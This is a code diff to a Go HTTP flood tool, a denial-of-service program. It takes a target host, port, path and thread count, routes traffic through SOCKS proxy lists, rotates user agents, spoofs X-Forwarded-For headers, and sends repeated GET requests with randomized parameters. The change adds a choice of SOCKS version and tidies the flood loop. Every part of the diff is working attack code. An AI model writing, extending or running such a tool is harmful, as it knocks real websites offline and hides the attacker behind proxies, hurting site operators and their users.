@@ -20,6 +20,7 @@ var (
 	targetPort          = os.Args[2]
 	threadNumber        = os.Args[3]
 	targetPath          = os.Args[4]
+	socksVersion        = os.Args[5]
 )
 
 func init() {
@@ -132,7 +133,7 @@ func Flood() {
 	cacheControl := "Cache-Control: no-cache\r\n"
 	xForwardFor := "X-Forwarded-For: " + socksAddress + "\r\n"
 	userAgent := "User-Agent: " + userAgents[rand.Intn(len(userAgents))] + "\r\n"
-	socksClient, err := proxyclient.NewProxyClient("socks5://" + socksAddress)
+	socksClient, err := proxyclient.NewProxyClient(socksVersion + "://" + socksAddress)
 	if err != nil {
 		return
 	}
@@ -147,20 +148,19 @@ func Flood() {
 			}
 			if err != nil {
 				return
-			} else {
-				defer dialer.Close()
-				for i := 0; i < 100; i++ {
-					headers := "GET " + targetPath + randomParams() + " " + httpVersion + host + connection + accept + cacheControl + xForwardFor + userAgent + "\r\n"
-					dialer.Write([]byte(headers))
-				}
-				fmt.Println("Flood sent " + socksAddress)
 			}
+			defer dialer.Close()
+			for i := 0; i < 100; i++ {
+				headers := "GET " + targetPath + randomParams() + " " + httpVersion + host + connection + accept + cacheControl + xForwardFor + userAgent + "\r\n"
+				dialer.Write([]byte(headers))
+			}
+			fmt.Println("Flood sent " + socksAddress)
 		}()
 	}
 }
 
 func main() {
-	proxies = readLines("socks5.txt")
+	proxies = readLines(socksVersion + ".txt")
 	userAgents = getUserAgents(100)
 	threadNumber, _ := strconv.Atoi(threadNumber)
 	for i := 0; i < threadNumber; i++ {
